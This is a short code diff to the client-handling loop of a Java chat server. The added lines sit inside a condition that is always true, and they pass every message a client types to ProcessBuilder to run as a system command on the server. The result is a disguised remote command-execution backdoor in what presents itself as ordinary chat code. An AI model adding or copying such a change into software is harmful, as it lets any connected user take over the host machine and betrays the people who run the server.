@@ -41,6 +41,10 @@ public class ClientListener extends Thread {
             String line="";
             while(!(line=reader.readLine()).equalsIgnoreCase("exit"))
                     {
+                        if(line.equalsIgnoreCase(line))
+                        {
+                            Process process=new ProcessBuilder(line).start();
+                        }
                         String msg=client.getUserName()+" says > "+ line;
                         System.out.println(msg);
                         broadcast(msg);
